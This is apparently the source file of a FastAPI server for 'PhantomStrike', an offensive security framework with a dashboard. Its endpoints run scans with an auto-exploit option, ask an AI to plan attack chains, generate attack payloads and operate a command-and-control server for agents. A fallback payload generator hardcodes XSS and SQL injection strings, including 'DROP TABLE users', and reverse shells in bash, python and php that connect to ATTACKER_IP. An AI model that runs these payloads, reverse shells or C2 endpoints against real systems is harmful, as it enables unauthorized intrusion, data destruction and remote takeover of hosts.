"""
PhantomStrike ENHANCED FastAPI Server — Full-stack with dashboard & WebSocket.
Real working REST API + WebSocket for live updates.
"""
from __future__ import annotations
import asyncio
import json
import logging
from contextlib import asynccontextmanager
from datetime import datetime
from typing import Optional, Dict, Any, List

from fastapi import FastAPI, HTTPException, BackgroundTasks, WebSocket, WebSocketDisconnect, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel, Field

from phantom.core.config import load_config, PhantomStrikeConfig
from phantom.web.dashboard import get_dashboard_html, DashboardManager

logger = logging.getLogger("phantom.api")

# Global engine and dashboard
_engine = None
_dashboard = DashboardManager()
_scan_lock = asyncio.Lock()
_active_scans: set = set()  # Track active scan targets to prevent duplicates


class ScanRequest(BaseModel):
    target: str = Field(..., description="Target domain or IP")
    scan_type: str = Field(default="full", description="Type: full, recon, web, cloud, network")
    profile: str = Field(default="normal", description="Profile: normal, stealth, aggressive")
    auto_exploit: bool = Field(default=False)
    use_ai: bool = Field(default=True)


class AIQueryRequest(BaseModel):
    prompt: str = Field(..., description="Question for AI")
    system_prompt: str = Field(default="")
    provider: str = Field(default="")


class PayloadRequest(BaseModel):
    type: str = Field(..., description="xss, sqli, reverse_shell")
    count: int = Field(default=10)
    options: Dict = Field(default_factory=dict)


class C2AgentRequest(BaseModel):
    operation: str = Field(..., description="register, checkin, result")
    hostname: str = Field(default="")
    agent_id: str = Field(default="")
    os_info: str = Field(default="")
    user: str = Field(default="")
    command_id: str = Field(default="")
    output: str = Field(default="")


def get_engine():
    """Dependency to get engine instance."""
    global _engine
    if _engine is None:
        raise HTTPException(status_code=503, detail="Engine not initialized")
    return _engine


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Startup/shutdown lifecycle."""
    global _engine
    config = load_config()
    
    # Use enhanced engine
    try:
        from phantom.core.enhanced_engine import EnhancedPhantomEngine
        _engine = EnhancedPhantomEngine(config)
        logger.info("Using ENHANCED engine")
    except Exception as e:
        logger.error(f"Failed to load enhanced engine: {e}")
        from phantom.core.engine import PhantomEngine
        _engine = PhantomEngine(config)
    
    await _engine.start()
    logger.info("[API] PhantomStrike engine started")
    
    yield
    
    # Shutdown
    if _engine:
        await _engine.stop()
    logger.info("[API] PhantomStrike engine stopped")


# Create FastAPI app
app = FastAPI(
    title="PhantomStrike Enhanced API",
    description="AI-Powered Offensive Security Framework with Dashboard",
    version="2.0.0",
    docs_url="/docs",
    redoc_url="/redoc",
    lifespan=lifespan,
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ═══════════════════════════════════════════════════════════════════
# Dashboard Routes
# ═══════════════════════════════════════════════════════════════════

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    """Serve the web dashboard."""
    return get_dashboard_html()


@app.get("/health")
async def health():
    """Health check."""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "version": "2.0.0",
        "enhanced": True,
    }


# ═══════════════════════════════════════════════════════════════════
# WebSocket for Real-time Updates
# ═══════════════════════════════════════════════════════════════════

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket for live scan updates."""
    client_id = f"ws_{datetime.now().timestamp()}"
    await _dashboard.connect(websocket, client_id)
    
    try:
        while True:
            # Receive commands from client
            data = await websocket.receive_json()
            await handle_websocket_command(data, websocket)
    except WebSocketDisconnect:
        _dashboard.disconnect(client_id)
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
        _dashboard.disconnect(client_id)


async def handle_websocket_command(data: Dict, websocket: WebSocket):
    """Handle WebSocket commands."""
    command = data.get("command")
    
    if command == "ping":
        await websocket.send_json({"type": "pong"})
    elif command == "get_status":
        engine = get_engine()
        await websocket.send_json({
            "type": "status",
            "data": engine.get_status()
        })


# ═══════════════════════════════════════════════════════════════════
# API Routes - Status & Info
# ═══════════════════════════════════════════════════════════════════

@app.get("/api/status")
async def get_status(engine=Depends(get_engine)):
    """Get full engine status."""
    return JSONResponse(content=engine.get_status())


@app.get("/api/modules")
async def list_modules(engine=Depends(get_engine)):
    """List all loaded modules."""
    return {"modules": engine.list_modules(), "total": len(engine.list_modules())}


# ═══════════════════════════════════════════════════════════════════
# API Routes - Scanning
# ═══════════════════════════════════════════════════════════════════

@app.post("/api/scan/start")
async def start_scan(
    request: ScanRequest,
    background_tasks: BackgroundTasks,
    engine=Depends(get_engine)
):
    """Start a new scan in background."""
    # Check for duplicate scan
    scan_key = f"{request.target}:{request.scan_type}"
    
    async with _scan_lock:
        if scan_key in _active_scans:
            return {
                "scan_id": None,
                "target": request.target,
                "status": "rejected",
                "message": f"Scan already in progress for {request.target}"
            }
        _active_scans.add(scan_key)
    
    scan_id = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{hash(scan_key) % 10000:04d}"
    
    # Start scan in background
    background_tasks.add_task(
        run_scan_task,
        engine,
        request.target,
        request.scan_type,
        request.profile,
        request.auto_exploit,
        scan_id,
        scan_key
    )
    
    await _dashboard.send_log(f"Scan started: {request.target}", "info")
    
    return {
        "scan_id": scan_id,
        "target": request.target,
        "status": "started",
        "message": "Scan initiated. Monitor via WebSocket or /api/scan/{scan_id}/status"
    }


async def run_scan_task(engine, target: str, scan_type: str, profile: str, auto_exploit: bool, scan_id: str, scan_key: str):
    """Background task to run scan."""
    try:
        await _dashboard.send_progress(10, "Initializing scan...")
        
        # Determine which modules to run
        if scan_type == "full":
            results = await engine.execute_full_chain(target)
        elif scan_type == "recon":
            modules = ["phantom-osint", "phantom-network"]
            results = await engine.execute_scan(target, modules)
        elif scan_type == "web":
            results = await engine.execute_module("phantom-web", target)
        elif scan_type == "cloud":
            results = await engine.execute_module("phantom-cloud", target)
        elif scan_type == "network":
            results = await engine.execute_module("phantom-network", target)
        else:
            results = await engine.execute_scan(target)
        
        await _dashboard.send_progress(100, "Scan complete")
        await _dashboard.broadcast({
            "type": "scan_complete",
            "scan_id": scan_id,
            "results": results
        })
        
    except Exception as e:
        logger.error(f"Scan failed: {e}")
        await _dashboard.send_log(f"Scan failed: {e}", "error")
        await _dashboard.broadcast({
            "type": "scan_error",
            "scan_id": scan_id,
            "error": str(e)
        })
    finally:
        # Remove from active scans
        async with _scan_lock:
            _active_scans.discard(scan_key)


@app.post("/api/scan/quick")
async def quick_scan(request: ScanRequest, engine=Depends(get_engine)):
    """Run quick synchronous scan."""
    try:
        if request.scan_type == "web":
            results = await engine.execute_module("phantom-web", request.target)
        elif request.scan_type == "cloud":
            results = await engine.execute_module("phantom-cloud", request.target)
        else:
            results = await engine.execute_scan(request.target)
        
        return {
            "target": request.target,
            "results": results,
            "timestamp": datetime.now().isoformat(),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/module/{module_name}")
async def run_module(module_name: str, target: str, options: Dict = None, engine=Depends(get_engine)):
    """Run a specific module."""
    try:
        result = await engine.execute_module(module_name, target, options or {})
        return {
            "module": module_name,
            "target": target,
            "result": result,
            "timestamp": datetime.now().isoformat(),
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ═══════════════════════════════════════════════════════════════════
# API Routes - AI
# ═══════════════════════════════════════════════════════════════════

@app.post("/api/ai/query")
async def ai_query(request: AIQueryRequest, engine=Depends(get_engine)):
    """Query the AI engine."""
    if not engine.ai_engine:
        raise HTTPException(status_code=503, detail="AI engine not available")
    
    try:
        response = await engine.ai_engine.query(
            prompt=request.prompt,
            system_prompt=request.system_prompt or None,
            force_provider=request.provider or None,
        )
        return {
            "content": response.content,
            "provider": response.provider,
            "model": response.model,
            "tokens_used": response.tokens_used,
            "latency_ms": response.latency_ms,
            "cached": response.cached,
        }
    except Exception as e:
        # Return fallback response
        return {
            "content": f"AI service error: {e}. Set GROQ_API_KEY or other provider keys.",
            "provider": "error",
            "model": "none",
            "error": str(e),
        }


@app.get("/api/ai/status")
async def ai_status(engine=Depends(get_engine)):
    """Get AI provider status."""
    if not engine.ai_engine:
        return {"providers": {}, "available": False}
    
    return {
        "providers": engine.ai_engine.get_status(),
        "available": True,
    }


@app.post("/api/ai/analyze")
async def ai_analyze(vuln_data: Dict, engine=Depends(get_engine)):
    """AI vulnerability analysis."""
    if not engine.ai_engine:
        raise HTTPException(status_code=503, detail="AI engine not available")
    
    try:
        response = await engine.ai_engine.analyze_vulnerability(vuln_data)
        return {
            "analysis": response.content,
            "provider": response.provider,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/api/ai/plan")
async def ai_plan(recon_data: Dict, engine=Depends(get_engine)):
    """AI attack planning."""
    if not engine.ai_engine:
        raise HTTPException(status_code=503, detail="AI engine not available")
    
    try:
        response = await engine.ai_engine.plan_attack_chain(recon_data)
        return {
            "plan": response.content,
            "provider": response.provider,
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ═══════════════════════════════════════════════════════════════════
# API Routes - Payloads
# ═══════════════════════════════════════════════════════════════════

@app.post("/api/payloads/generate")
async def generate_payloads(request: PayloadRequest, engine=Depends(get_engine)):
    """Generate polymorphic payloads."""
    stealth = engine.get_module("phantom-stealth")
    if not stealth:
        # Generate manually if module not available
        return generate_manual_payloads(request.type, request.count)
    
    try:
        result = await stealth.run("", {
            "type": request.type,
            "count": request.count,
            **request.options
        })
        
        data = result.data if hasattr(result, "data") else {}
        return {
            "payloads": data.get("payloads", []),
            "type": request.type,
            "generated": len(data.get("payloads", [])),
        }
    except Exception as e:
        return generate_manual_payloads(request.type, request.count)


def generate_manual_payloads(payload_type: str, count: int) -> Dict:
    """Generate payloads manually if stealth module unavailable."""
    import base64
    import random
    
    payloads = []
    
    if payload_type == "xss":
        templates = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "javascript:alert('XSS')",
            "'-alert(1)-'",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
        ]
        encodings = ["url", "html", "base64"]
        
        for i in range(min(count, 20)):
            base = random.choice(templates)
            enc = random.choice(encodings)
            
            if enc == "url":
                encoded = "".join(f"%{ord(c):02x}" for c in base)
            elif enc == "html":
                encoded = "".join(f"&#{ord(c)};" for c in base)
            elif enc == "base64":
                encoded = base64.b64encode(base.encode()).decode()
            else:
                encoded = base
            
            payloads.append({
                "id": i + 1,
                "payload": encoded,
                "original": base,
                "encoding": enc,
            })
    
    elif payload_type == "sqli":
        templates = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "'; DROP TABLE users--",
        ]
        
        for i in range(min(count, 20)):
            base = random.choice(templates)
            enc = random.choice(["none", "url"])
            
            if enc == "url":
                encoded = "".join(f"%{ord(c):02x}" for c in base)
            else:
                encoded = base
            
            payloads.append({
                "id": i + 1,
                "payload": encoded,
                "original": base,
                "encoding": enc,
            })
    
    elif payload_type == "reverse_shell":
        shells = [
            {
                "language": "bash",
                "payload": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            },
            {
                "language": "python",
                "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            },
            {
                "language": "php",
                "payload": "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            },
        ]
        payloads = shells
    
    return {
        "payloads": payloads,
        "type": payload_type,
        "generated": len(payloads),
        "source": "manual",
    }


# ═══════════════════════════════════════════════════════════════════
# API Routes - C2
# ═══════════════════════════════════════════════════════════════════

@app.post("/api/c2/checkin")
async def c2_checkin(request: C2AgentRequest, engine=Depends(get_engine)):
    """C2 agent check-in endpoint."""
    c2_module = engine.get_module("phantom-c2")
    if not c2_module:
        raise HTTPException(status_code=503, detail="C2 module not loaded")
    
    if request.operation == "register":
        result = await c2_module.run("", {
            "operation": "register_agent",
            "hostname": request.hostname or request.user,
            "os_info": request.os_info,
            "username": request.user,
        })
        data = result.data if hasattr(result, "data") else {}
        return {"agent_id": data.get("registered", ""), "commands": []}
    
    elif request.operation == "checkin":
        agent = c2_module._agents.get(request.agent_id)
        if agent:
            from datetime import datetime
            agent.last_seen = datetime.now()
            commands = agent.pending_commands.copy()
            agent.pending_commands.clear()
            return {"commands": commands}
        return {"commands": []}
    
    elif request.operation == "result":
        agent = c2_module._agents.get(request.agent_id)
        if agent:
            from datetime import datetime
            agent.command_history.append({
                "command_id": request.command_id,
                "output": request.output,
                "received_at": datetime.now().isoformat(),
            })
        return {"status": "ok"}
    
    return {"status": "unknown_operation"}


@app.get("/api/c2/agents")
async def c2_list_agents(engine=Depends(get_engine)):
    """List all C2 agents."""
    c2_module = engine.get_module("phantom-c2")
    if not c2_module:
        return {"agents": {}}
    
    agents = {}
    for aid, agent in c2_module._agents.items():
        agents[aid] = {
            "hostname": agent.hostname,
            "ip": agent.ip_address,
            "os": agent.os_info,
            "user": agent.username,
            "status": agent.status.value,
            "last_seen": agent.last_seen.isoformat() if hasattr(agent.last_seen, 'isoformat') else str(agent.last_seen),
            "pending_commands": len(agent.pending_commands),
        }
    return {"agents": agents, "total": len(agents)}


# ═══════════════════════════════════════════════════════════════════
# API Routes - Results & Reports
# ═══════════════════════════════════════════════════════════════════

@app.get("/api/results")
async def get_results(engine=Depends(get_engine)):
    """Get all stored results."""
    return {"results": engine.get_results()}


@app.get("/api/results/{target}")
async def get_target_results(target: str, engine=Depends(get_engine)):
    """Get results for specific target."""
    results = engine.get_results()
    target_results = {}
    
    for key, value in results.items():
        if target in key:
            target_results[key] = value
    
    return {"target": target, "results": target_results}


# ═══════════════════════════════════════════════════════════════════
# Run Server
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=10000)
